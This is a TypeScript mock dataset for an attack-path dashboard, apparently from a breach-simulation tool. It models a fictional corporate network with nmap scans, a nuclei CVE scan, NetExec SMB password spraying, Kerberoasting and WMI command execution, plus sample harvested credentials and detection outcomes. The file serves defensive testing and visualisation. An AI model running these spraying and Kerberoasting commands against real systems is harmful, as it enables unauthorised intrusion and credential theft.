export const MOCK_SCENARIO_CRED_SPRAY_NO_PIVOT: AttackPathData = {
  attack_path_nodes: [
    // ── 8 active ASSET nodes ──────────────────────────────────────────────────
    { node_id:'cs2-ep01', node_type:'ASSET', node_label:'CORP-WEB-01', node_hostname:'CORP-WEB-01',
      node_ip:'10.20.0.10', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'DMZ', node_subnet:'10.20.0.0/24', node_is_entry_point:true,
      node_agents:['sentinel_one', 'openaev'],
      node_credentials_found:['webadmin:Welcome1!'], node_accessed_files:['/etc/nginx/nginx.conf'] },
    { node_id:'cs2-ep02', node_type:'ASSET', node_label:'CORP-APP-01', node_hostname:'CORP-APP-01',
      node_ip:'10.20.1.10', node_platform:'Windows Server 2019', node_status:'undetected',
      node_zone:'App Tier', node_subnet:'10.20.1.0/24',
      node_user_privileges:'CORP\\svc_app (Service Account)',
      node_agents:['sentinel_one'],
      node_credentials_found:['CORP\\svc_app:AppSvc2024!','CORP\\svc_db:DbPass2024!'] },
    { node_id:'cs2-ep03', node_type:'ASSET', node_label:'CORP-DB-01', node_hostname:'CORP-DB-01',
      node_ip:'10.20.1.20', node_platform:'Windows Server 2022', node_status:'undetected',
      node_zone:'DB Tier', node_subnet:'10.20.1.0/24',
      node_user_privileges:'sa (SQL Server System Administrator)',
      node_agents:['sentinel_one'],
      node_credentials_found:['sa:Sql@dm1n2024','CORP\\Administrator:CorpAdmin!2024'] },
    { node_id:'cs2-ep04', node_type:'ASSET', node_label:'CORP-JUMP-01', node_hostname:'CORP-JUMP-01',
      node_ip:'10.20.2.5', node_platform:'Windows Server 2022', node_status:'undetected',
      node_zone:'Management', node_subnet:'10.20.2.0/24',
      node_agents:['openaev'],
      node_user_privileges:'CORP\\Administrator (Domain Admin)' },
    { node_id:'cs2-ep05', node_type:'ASSET', node_label:'CORP-WS-01', node_hostname:'CORP-WS-01',
      node_ip:'10.20.3.10', node_platform:'Windows 11', node_status:'undetected',
      node_zone:'Workstations', node_subnet:'10.20.3.0/24',
      node_user_privileges:'CORP\\jdoe (Standard User)',
      node_agents:['sentinel_one', 'openaev'],
      node_accessed_files:['C:\\Users\\jdoe\\Documents\\Budget_2026.xlsx'] },
    { node_id:'cs2-ep06', node_type:'ASSET', node_label:'CORP-WS-02', node_hostname:'CORP-WS-02',
      node_ip:'10.20.3.11', node_platform:'Windows 11', node_status:'detected',
      node_zone:'Workstations', node_subnet:'10.20.3.0/24',
      node_user_privileges:'CORP\\asmith (Power User)',
      node_agents:['palo_alto'],
      node_credentials_found:['CORP\\asmith:Smith@2024'] },
    { node_id:'cs2-ep07', node_type:'ASSET', node_label:'CORP-DC-01', node_hostname:'CORP-DC-01',
      node_ip:'10.20.4.5', node_platform:'Windows Server 2022', node_status:'prevented',
      node_agents:['palo_alto', 'sentinel_one', 'openaev'],
      node_zone:'Domain Controllers', node_subnet:'10.20.4.0/24' },
    { node_id:'cs2-ep08', node_type:'ASSET', node_label:'CORP-FILE-01', node_hostname:'CORP-FILE-01',
      node_ip:'10.20.1.30', node_platform:'Windows Server 2019', node_status:'undetected',
      node_zone:'File Servers', node_subnet:'10.20.1.0/24',
      node_agents:['palo_alto', 'sentinel_one'],
      node_accessed_files:['\\\\CORP-FILE-01\\Finance\\Q4_Projections.xlsx','\\\\CORP-FILE-01\\HR\\Salaries_2026.xlsx'] },
    // ── 7 untouched/discovered ASSET nodes ───────────────────────────────────
    { node_id:'cs2-ep09', node_type:'ASSET', node_label:'CORP-WS-03', node_hostname:'CORP-WS-03',
      node_ip:'10.20.3.12', node_platform:'Windows 11', node_status:'undetected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Workstations', node_subnet:'10.20.3.0/24', node_untouched:true },
    { node_id:'cs2-ep10', node_type:'ASSET', node_label:'CORP-WS-04', node_hostname:'CORP-WS-04',
      node_ip:'10.20.3.13', node_platform:'Windows 10', node_status:'undetected',
      node_agents:['openaev'],
      node_zone:'Workstations', node_subnet:'10.20.3.0/24', node_untouched:true },
    { node_id:'cs2-ep11', node_type:'ASSET', node_label:'CORP-WS-05', node_hostname:'CORP-WS-05',
      node_ip:'10.20.3.14', node_platform:'Windows 10', node_status:'undetected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Workstations', node_subnet:'10.20.3.0/24', node_untouched:true },
    { node_id:'cs2-ep12', node_type:'ASSET', node_label:'CORP-APP-02', node_hostname:'CORP-APP-02',
      node_ip:'10.20.1.11', node_platform:'Windows Server 2019', node_status:'undetected',
      node_agents:['sentinel_one'],
      node_zone:'App Tier', node_subnet:'10.20.1.0/24', node_untouched:true },
    { node_id:'cs2-ep13', node_type:'ASSET', node_label:'CORP-PRINT-01', node_hostname:'CORP-PRINT-01',
      node_ip:'10.20.2.20', node_platform:'Windows Server 2016', node_status:'undetected',
      node_agents:['openaev'],
      node_zone:'Management', node_subnet:'10.20.2.0/24', node_untouched:true },
    { node_id:'cs2-ep14', node_type:'ASSET', node_label:'CORP-BACKUP-01', node_hostname:'CORP-BACKUP-01',
      node_ip:'10.20.5.10', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Backup', node_subnet:'10.20.5.0/24', node_untouched:true },
    { node_id:'cs2-ep15', node_type:'ASSET', node_label:'CORP-MONITOR-01', node_hostname:'CORP-MONITOR-01',
      node_ip:'10.20.5.20', node_platform:'CentOS 7', node_status:'undetected',
      node_agents:['openaev'],
      node_zone:'Monitoring', node_subnet:'10.20.5.0/24', node_untouched:true },
    // ── ACTION nodes ─────────────────────────────────────────────────────────
    { node_id:'cs2-act-nmap01', node_type:'ACTION', node_label:'Nmap Host Discovery — Corp Subnet',
      node_status:'undetected', node_payload_name:'nmap – Host Discovery',
      node_command:'nmap', node_arguments:'-sn 10.20.0.0/16',
      node_executed_at:'2026-06-13T06:00:00Z', node_agent:'openaev', node_ip:'10.20.0.10',
      node_expectations:[{expectation_id:'cs2-e-nmap01',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for CORP-WEB-01 (10.20.0.10)
Host is up (0.0012s latency).
Nmap scan report for CORP-APP-01 (10.20.1.10)
Host is up (0.0018s latency).
Nmap scan report for CORP-DB-01 (10.20.1.20)
Host is up (0.0021s latency).
Nmap scan report for CORP-JUMP-01 (10.20.2.5)
Host is up (0.0019s latency).
Nmap done: 15 IP addresses (15 hosts up) scanned in 12.34s` },
    { node_id:'cs2-act-nmap02', node_type:'ACTION', node_label:'Nmap Service Scan — CORP-WEB-01',
      node_status:'undetected', node_payload_name:'nmap – Service Scan',
      node_command:'nmap', node_arguments:'-sS -sV -T4 -p 22,80,443,8080,8443,3000 10.20.0.10',
      node_executed_at:'2026-06-13T06:08:00Z', node_agent:'openaev', node_ip:'10.20.0.10',
      node_expectations:[{expectation_id:'cs2-e-nmap02',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Starting Nmap 7.95
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 8.9p1
80/tcp   open  http      nginx 1.24.0
443/tcp  open  ssl/https nginx 1.24.0
3000/tcp open  http      Grafana 9.5.2
8080/tcp open  http      Jenkins 2.401.3
Nmap done: 1 IP address (1 host up) scanned in 4.22s`,
      node_ports_found:['22/tcp open ssh OpenSSH 8.9p1 Ubuntu', '80/tcp open http nginx 1.24.0', '443/tcp open ssl/https nginx 1.24.0', '3000/tcp open http Grafana 9.5.2', '8080/tcp open http Jenkins 2.401.3'] },
    { node_id:'cs2-act-nuclei01', node_type:'ACTION', node_label:'Nuclei CVE Scan — CORP-WEB-01',
      node_status:'undetected', node_payload_name:'nuclei – Multi-CVE Web Scan',
      node_command:'nuclei', node_arguments:'-u http://10.20.0.10 -t cves/ -severity high,critical',
      node_executed_at:'2026-06-13T06:20:00Z', node_agent:'sentinel_one', node_ip:'10.20.0.10',
      node_credentials_found:['webadmin:Welcome1!'],
      node_accessed_files:['/etc/nginx/nginx.conf'],
      node_expectations:[{expectation_id:'cs2-e-nuclei01',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[INF] nuclei - Fast and customisable vulnerability scanner
[2026-06-13 06:20:15] [CVE-2023-41425] [http] [high] http://10.20.0.10 — Grafana path traversal
[2026-06-13 06:20:22] [CVE-2023-27898] [http] [critical] http://10.20.0.10:8080 — Jenkins RCE
[+] Jenkins script console accessible without auth
[+] Extracted credential from jenkins config: webadmin:Welcome1!`,
      node_cves_found:['CVE-2023-27898 (Jenkins RCE unauthenticated) - CRITICAL', 'CVE-2023-41425 (Grafana path traversal) - HIGH', 'CVE-2022-25845 (Fastjson RCE) - HIGH'] },
    { node_id:'cs2-act-spray01', node_type:'ACTION', node_label:'NetExec SMB Spray — admin:admin',
      node_status:'prevented', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.0/24 -u admin -p admin --no-bruteforce',
      node_executed_at:'2026-06-13T06:35:00Z', node_agent:'palo_alto', node_ip:'10.20.1.10',
      node_expectations:[{expectation_id:'cs2-e-spray01',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.10  445  CORP-APP-01  [*] Windows Server 2019 x64
SMB    10.20.1.10  445  CORP-APP-01  [-] CORP\\admin:admin STATUS_LOGON_FAILURE
[!] DETECTION: Windows Security Event 4625 — Failed logon (admin) flagged by SIEM` },
    { node_id:'cs2-act-spray02', node_type:'ACTION', node_label:'NetExec SMB Spray — administrator:Password1',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.0/24 -u administrator -p Password1 --no-bruteforce',
      node_executed_at:'2026-06-13T06:37:00Z', node_agent:'palo_alto', node_ip:'10.20.1.10',
      node_expectations:[{expectation_id:'cs2-e-spray02',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.10  445  CORP-APP-01  [*] Windows Server 2019 x64
SMB    10.20.1.10  445  CORP-APP-01  [-] CORP\\administrator:Password1 STATUS_LOGON_FAILURE` },
    { node_id:'cs2-act-spray03', node_type:'ACTION', node_label:'NetExec SMB Spray — svc_app:Summer2024!',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.0/24 -u svc_app -p Summer2024! --no-bruteforce',
      node_executed_at:'2026-06-13T06:39:00Z', node_agent:'sentinel_one', node_ip:'10.20.1.10',
      node_expectations:[{expectation_id:'cs2-e-spray03',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.10  445  CORP-APP-01  [*] Windows Server 2019 x64
SMB    10.20.1.10  445  CORP-APP-01  [-] CORP\\svc_app:Summer2024! STATUS_LOGON_FAILURE` },
    { node_id:'cs2-act-spray04', node_type:'ACTION', node_label:'NetExec SMB Spray — svc_app:AppSvc2024! ✓',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.0/24 -u svc_app -p AppSvc2024! --shares',
      node_executed_at:'2026-06-13T06:42:00Z', node_agent:'palo_alto', node_ip:'10.20.1.10',
      node_credentials_found:['CORP\\svc_app:AppSvc2024!','CORP\\svc_db:DbPass2024!'],
      node_accessed_files:['C:\\AppServer\\web.config','C:\\AppServer\\appsettings.json'],
      node_expectations:[{expectation_id:'cs2-e-spray04',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.10  445  CORP-APP-01  [*] Windows Server 2019 x64
SMB    10.20.1.10  445  CORP-APP-01  [+] CORP\\svc_app:AppSvc2024! (Pwn3d!)
SMB    10.20.1.10  445  CORP-APP-01  [+] web.config: svc_db:DbPass2024!` },
    { node_id:'cs2-act-spray05', node_type:'ACTION', node_label:'NetExec SMB Spray — svc_db:DbPass2024! ✓',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.20 -u svc_db -p DbPass2024! --shares',
      node_executed_at:'2026-06-13T06:50:00Z', node_agent:'palo_alto', node_ip:'10.20.1.20',
      node_credentials_found:['sa:Sql@dm1n2024'],
      node_accessed_files:['C:\\Program Files\\Microsoft SQL Server\\MSSQL\\DATA\\master.mdf'],
      node_expectations:[{expectation_id:'cs2-e-spray05',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.20  445  CORP-DB-01  [*] Windows Server 2022 x64
SMB    10.20.1.20  445  CORP-DB-01  [+] CORP\\svc_db:DbPass2024! (Pwn3d!)
MSSQL  10.20.1.20  1433 CORP-DB-01  [+] sa:Sql@dm1n2024 — SQL Server login successful` },
    { node_id:'cs2-act-spray06', node_type:'ACTION', node_label:'NetExec SMB Spray — administrator:CorpAdmin!2024 ✓',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.2.5 -u administrator -p "CorpAdmin!2024" --shares',
      node_executed_at:'2026-06-13T07:05:00Z', node_agent:'openaev', node_ip:'10.20.2.5',
      node_user_privileges:'CORP\\Administrator (Domain Admin)',
      node_expectations:[{expectation_id:'cs2-e-spray06',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.2.5  445  CORP-JUMP-01  [*] Windows Server 2022 x64
SMB    10.20.2.5  445  CORP-JUMP-01  [+] CORP\\administrator:CorpAdmin!2024 (Pwn3d!)
SMB    10.20.2.5  445  CORP-JUMP-01  [+] ADMIN$ accessible — full control` },
    { node_id:'cs2-act-spray07', node_type:'ACTION', node_label:'NetExec SMB Spray — jdoe:Welcome1! ✓',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.3.10 -u jdoe -p Welcome1! --shares',
      node_executed_at:'2026-06-13T07:15:00Z', node_agent:'openaev', node_ip:'10.20.3.10',
      node_user_privileges:'CORP\\jdoe (Standard User)',
      node_accessed_files:['C:\\Users\\jdoe\\Documents\\Budget_2026.xlsx'],
      node_expectations:[{expectation_id:'cs2-e-spray07',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.3.10  445  CORP-WS-01  [*] Windows 11 x64
SMB    10.20.3.10  445  CORP-WS-01  [+] CORP\\jdoe:Welcome1! (Pwn3d!)
SMB    10.20.3.10  445  CORP-WS-01  [+] Budget_2026.xlsx found` },
    { node_id:'cs2-act-spray08', node_type:'ACTION', node_label:'NetExec SMB Spray — asmith:Smith@2024',
      node_status:'detected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.3.11 -u asmith -p "Smith@2024" --shares',
      node_executed_at:'2026-06-13T07:20:00Z', node_agent:'openaev', node_ip:'10.20.3.11',
      node_user_privileges:'CORP\\asmith (Power User)',
      node_credentials_found:['CORP\\asmith:Smith@2024'],
      node_expectations:[{expectation_id:'cs2-e-spray08',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.3.11  445  CORP-WS-02  [*] Windows 11 x64
SMB    10.20.3.11  445  CORP-WS-02  [+] CORP\\asmith:Smith@2024 (Pwn3d!)
[!] DETECTION: CrowdStrike EDR detected lateral movement from CORP-APP-01 to CORP-WS-02` },
    { node_id:'cs2-act-spray09', node_type:'ACTION', node_label:'NetExec SMB Spray — administrator:DCAdmin2024! (DC)',
      node_status:'prevented', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.4.5 -u administrator -p DCAdmin2024! --shares',
      node_executed_at:'2026-06-13T07:30:00Z', node_agent:'openaev', node_ip:'10.20.4.5',
      node_expectations:[{expectation_id:'cs2-e-spray09',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.4.5  445  CORP-DC-01  [*] Windows Server 2022 x64
SMB    10.20.4.5  445  CORP-DC-01  [-] CORP\\administrator:DCAdmin2024! STATUS_LOGON_FAILURE
[!] PREVENTION: Microsoft Defender for Identity blocked auth attempt` },
    { node_id:'cs2-act-spray10', node_type:'ACTION', node_label:'NetExec SMB Spray — administrator:CorpAdmin!2024 (File Server) ✓',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.30 -u administrator -p "CorpAdmin!2024" --shares',
      node_executed_at:'2026-06-13T07:40:00Z', node_agent:'sentinel_one', node_ip:'10.20.1.30',
      node_user_privileges:'CORP\\Administrator (Domain Admin)',
      node_accessed_files:['\\\\CORP-FILE-01\\Finance\\Q4_Projections.xlsx','\\\\CORP-FILE-01\\HR\\Salaries_2026.xlsx'],
      node_expectations:[{expectation_id:'cs2-e-spray10',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.30  445  CORP-FILE-01  [*] Windows Server 2019 x64
SMB    10.20.1.30  445  CORP-FILE-01  [+] CORP\\administrator:CorpAdmin!2024 (Pwn3d!)
SMB    10.20.1.30  445  CORP-FILE-01  [+] Finance\\Q4_Projections.xlsx — read` },
    { node_id:'cs2-act-spray11', node_type:'ACTION', node_label:'NetExec LDAP Kerberoasting — svc_app:AppSvc2024!',
      node_status:'detected', node_payload_name:'netexec – LDAP Kerberoasting',
      node_command:'netexec', node_arguments:'ldap 10.20.4.5 -u svc_app -p AppSvc2024! --kerberoasting',
      node_executed_at:'2026-06-13T07:50:00Z', node_agent:'sentinel_one', node_ip:'10.20.4.5',
      node_credentials_found:['CORP\\krbtgt:$HASH$AES256'],
      node_expectations:[{expectation_id:'cs2-e-spray11',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
      node_terminal_output:`LDAP   10.20.4.5  389  CORP-DC-01  [*] Windows Server 2022 x64
LDAP   10.20.4.5  389  CORP-DC-01  [+] sAMAccountName: svc_mssql
$krbtgt$23$*svc_mssql*CORP.LOCAL*MSSQLSvc/CORP-DB-01*...
[!] DETECTION: Kerberoasting activity flagged by SIEM (Event ID 4769 bulk)` },
    { node_id:'cs2-act-spray12', node_type:'ACTION', node_label:'NetExec WMI Exec — administrator:CorpAdmin!2024 ✓',
      node_status:'undetected', node_payload_name:'netexec – WMI remote exec',
      node_command:'netexec', node_arguments:'wmi 10.20.2.5 -u administrator -p "CorpAdmin!2024" -x "whoami /all"',
      node_executed_at:'2026-06-13T08:00:00Z', node_agent:'sentinel_one', node_ip:'10.20.2.5',
      node_user_privileges:'CORP\\Administrator (Domain Admin)',
      node_credentials_found:['CORP\\Administrator:CorpAdmin!2024'],
      node_expectations:[{expectation_id:'cs2-e-spray12',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`WMI    10.20.2.5  445  CORP-JUMP-01  [*] Windows Server 2022 x64
WMI    10.20.2.5  445  CORP-JUMP-01  [+] CORP\\administrator:CorpAdmin!2024 (Pwn3d!)
WMI    10.20.2.5  445  CORP-JUMP-01  [+] Domain: CORP.LOCAL (Domain Admin level)` },
    // ── Multi-variant: same SMB spray action on CORP-APP-01 (cs2-ep02) with different credentials ──
    { node_id:'cs2-act-spray13', node_type:'ACTION', node_label:'NetExec SMB Spray — svc_app:AppSvc2023!',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.10 -u svc_app -p AppSvc2023! --no-bruteforce',
      node_executed_at:'2026-06-13T06:44:00Z', node_agent:'sentinel_one', node_ip:'10.20.1.10',
      node_expectations:[{expectation_id:'cs2-e-spray13',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.10  445  CORP-APP-01  [-] CORP\\svc_app:AppSvc2023! STATUS_LOGON_FAILURE` },
    { node_id:'cs2-act-spray14', node_type:'ACTION', node_label:'NetExec SMB Spray — svc_app:P@ssw0rd',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.10 -u svc_app -p P@ssw0rd --no-bruteforce',
      node_executed_at:'2026-06-13T06:46:00Z', node_agent:'palo_alto', node_ip:'10.20.1.10',
      node_expectations:[{expectation_id:'cs2-e-spray14',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.10  445  CORP-APP-01  [-] CORP\\svc_app:P@ssw0rd STATUS_LOGON_FAILURE` },
    { node_id:'cs2-act-spray15', node_type:'ACTION', node_label:'NetExec SMB Spray — svc_app:Welcome123!',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.10 -u svc_app -p Welcome123! --no-bruteforce',
      node_executed_at:'2026-06-13T06:48:00Z', node_agent:'sentinel_one', node_ip:'10.20.1.10',
      node_expectations:[{expectation_id:'cs2-e-spray15',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.10  445  CORP-APP-01  [-] CORP\\svc_app:Welcome123! STATUS_LOGON_FAILURE` },
    { node_id:'cs2-act-spray16', node_type:'ACTION', node_label:'NetExec SMB Spray — svc_app:Corp@2024',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.10 -u svc_app -p Corp@2024 --no-bruteforce',
      node_executed_at:'2026-06-13T06:49:00Z', node_agent:'sentinel_one', node_ip:'10.20.1.10',
      node_expectations:[{expectation_id:'cs2-e-spray16',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.10  445  CORP-APP-01  [-] CORP\\svc_app:Corp@2024 STATUS_LOGON_FAILURE` },
    { node_id:'cs2-act-spray17', node_type:'ACTION', node_label:'NetExec SMB Spray — svc_app:Qwerty2024!',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.10 -u svc_app -p Qwerty2024! --no-bruteforce',
      node_executed_at:'2026-06-13T06:50:30Z', node_agent:'palo_alto', node_ip:'10.20.1.10',
      node_expectations:[{expectation_id:'cs2-e-spray17',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.20.1.10  445  CORP-APP-01  [-] CORP\\svc_app:Qwerty2024! STATUS_LOGON_FAILURE` },
    // ── Multi-variant: nmap port scans on CORP-WEB-01 (cs2-ep01) with different port ranges ──
    { node_id:'cs2-act-nmap03', node_type:'ACTION', node_label:'Nmap UDP Scan — CORP-WEB-01',
      node_status:'undetected', node_payload_name:'nmap – UDP Scan',
      node_command:'nmap', node_arguments:'-sU -T4 -p 53,161,500,4500 10.20.0.10',
      node_executed_at:'2026-06-13T06:10:00Z', node_agent:'openaev', node_ip:'10.20.0.10',
      node_expectations:[{expectation_id:'cs2-e-nmap03',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 53/udp dns open, 161/udp snmp open (community: public)`,
      node_ports_found:['53/udp open domain dnsmasq 2.89', '123/udp open ntp', '161/udp open snmp (community: public)'] },
    { node_id:'cs2-act-nmap04', node_type:'ACTION', node_label:'Nmap Script Scan — CORP-WEB-01',
      node_status:'detected', node_payload_name:'nmap – Script Scan',
      node_command:'nmap', node_arguments:'-sC -sV --script=http-headers,http-title 10.20.0.10',
      node_executed_at:'2026-06-13T06:12:00Z', node_agent:'openaev', node_ip:'10.20.0.10',
      node_expectations:[{expectation_id:'cs2-e-nmap04',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
      node_terminal_output:`[!] DETECTION: IDS alert — nmap script scan from 192.168.100.50`,
      node_ports_found:['80/tcp open http nginx 1.24.0', '443/tcp open ssl/https', '8080/tcp open http Jenkins 2.401.3'],
      node_cves_found:['CVE-2023-27898 (Jenkins RCE unauthenticated) - CRITICAL', 'CVE-2023-41425 (Grafana path traversal) - HIGH'] },
    { node_id:'cs2-act-nmap05', node_type:'ACTION', node_label:'Nmap OS Detection — CORP-WEB-01',
      node_status:'undetected', node_payload_name:'nmap – OS Detection',
      node_command:'nmap', node_arguments:'-O --osscan-guess 10.20.0.10',
      node_executed_at:'2026-06-13T06:14:00Z', node_agent:'openaev', node_ip:'10.20.0.10',
      node_expectations:[{expectation_id:'cs2-e-nmap05',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`OS guess: Linux 5.15 (kernel 5.15.0-94-generic) — 98% accuracy`,
      node_ports_found:['22/tcp open ssh OpenSSH 8.9p1', '80/tcp open http nginx 1.24.0', '443/tcp open ssl/https nginx 1.24.0', '8080/tcp open http Jenkins 2.401.3'] },
  ],
  attack_path_edges: [
    // Asset links only — NO pivot (EP→EP) edges
    { edge_id:'cs2-al-nmap01', edge_type:'asset_link', edge_source:'cs2-act-nmap01', edge_target:'cs2-ep01' },
    { edge_id:'cs2-al-nmap02', edge_type:'asset_link', edge_source:'cs2-act-nmap02', edge_target:'cs2-ep01' },
    { edge_id:'cs2-al-nmap03', edge_type:'asset_link', edge_source:'cs2-act-nmap03', edge_target:'cs2-ep01' },
    { edge_id:'cs2-al-nmap04', edge_type:'asset_link', edge_source:'cs2-act-nmap04', edge_target:'cs2-ep01' },
    { edge_id:'cs2-al-nmap05', edge_type:'asset_link', edge_source:'cs2-act-nmap05', edge_target:'cs2-ep01' },
    { edge_id:'cs2-al-nuclei01', edge_type:'asset_link', edge_source:'cs2-act-nuclei01', edge_target:'cs2-ep01' },
    { edge_id:'cs2-al-spray01', edge_type:'asset_link', edge_source:'cs2-act-spray01', edge_target:'cs2-ep02' },
    { edge_id:'cs2-al-spray02', edge_type:'asset_link', edge_source:'cs2-act-spray02', edge_target:'cs2-ep02' },
    { edge_id:'cs2-al-spray03', edge_type:'asset_link', edge_source:'cs2-act-spray03', edge_target:'cs2-ep02' },
    { edge_id:'cs2-al-spray04', edge_type:'asset_link', edge_source:'cs2-act-spray04', edge_target:'cs2-ep02' },
    { edge_id:'cs2-al-spray13', edge_type:'asset_link', edge_source:'cs2-act-spray13', edge_target:'cs2-ep02' },
    { edge_id:'cs2-al-spray14', edge_type:'asset_link', edge_source:'cs2-act-spray14', edge_target:'cs2-ep02' },
    { edge_id:'cs2-al-spray15', edge_type:'asset_link', edge_source:'cs2-act-spray15', edge_target:'cs2-ep02' },
    { edge_id:'cs2-al-spray16', edge_type:'asset_link', edge_source:'cs2-act-spray16', edge_target:'cs2-ep02' },
    { edge_id:'cs2-al-spray17', edge_type:'asset_link', edge_source:'cs2-act-spray17', edge_target:'cs2-ep02' },
    { edge_id:'cs2-al-spray05', edge_type:'asset_link', edge_source:'cs2-act-spray05', edge_target:'cs2-ep03' },
    { edge_id:'cs2-al-spray06', edge_type:'asset_link', edge_source:'cs2-act-spray06', edge_target:'cs2-ep04' },
    { edge_id:'cs2-al-spray07', edge_type:'asset_link', edge_source:'cs2-act-spray07', edge_target:'cs2-ep05' },
    { edge_id:'cs2-al-spray08', edge_type:'asset_link', edge_source:'cs2-act-spray08', edge_target:'cs2-ep06' },
    { edge_id:'cs2-al-spray09', edge_type:'asset_link', edge_source:'cs2-act-spray09', edge_target:'cs2-ep07' },
    { edge_id:'cs2-al-spray10', edge_type:'asset_link', edge_source:'cs2-act-spray10', edge_target:'cs2-ep08' },
    { edge_id:'cs2-al-spray11', edge_type:'asset_link', edge_source:'cs2-act-spray11', edge_target:'cs2-ep07' },
    { edge_id:'cs2-al-spray12', edge_type:'asset_link', edge_source:'cs2-act-spray12', edge_target:'cs2-ep04' },
    // No pivot edges — injectors only
  ],
  attack_path_stats: {
    stats_prevented: 2,
    stats_detected: 3,
    stats_undetected: 7,
    stats_pending: 7,
    stats_total_actions: 12,
    stats_executed_actions: 12,
    stats_captured_endpoints: 6,
    stats_captured_files: 5,
    stats_captured_credentials: 8,
    stats_captured_users: 6,
    stats_captured_cves: 4,
  },
  attack_path_definitions: [
    { path_id:'cs2-p1', path_name:'Credential Spray → Domain Pivoting (Injectors Only)', path_color:'#9c27b0',
      node_ids:['cs2-ep01','cs2-ep02','cs2-ep03','cs2-ep04','cs2-ep05','cs2-ep06','cs2-ep07','cs2-ep08'],
      path_outcome:'partial',
      path_fail_reason:'DC access PREVENTED by MDE identity protection',
      failed_from_node_id:'cs2-ep07',
      path_segment_reasons:{
        'cs2-ep01->cs2-ep02':'Jenkins RCE → credential reuse via SMB spray',
        'cs2-ep02->cs2-ep03':'svc_db password from web.config → DB server',
        'cs2-ep02->cs2-ep04':'Administrator creds found → jump server',
        'cs2-ep04->cs2-ep05':'Domain Admin credential spray to workstation',
        'cs2-ep04->cs2-ep06':'SMB spray (DETECTED by CrowdStrike)',
        'cs2-ep04->cs2-ep07':'DC access PREVENTED by MDE',
        'cs2-ep04->cs2-ep08':'File server access — sensitive files exfiltrated',
      },
    },
  ],
};

export const MOCK_SCENARIO_CRED_SPRAY: AttackPathData = {
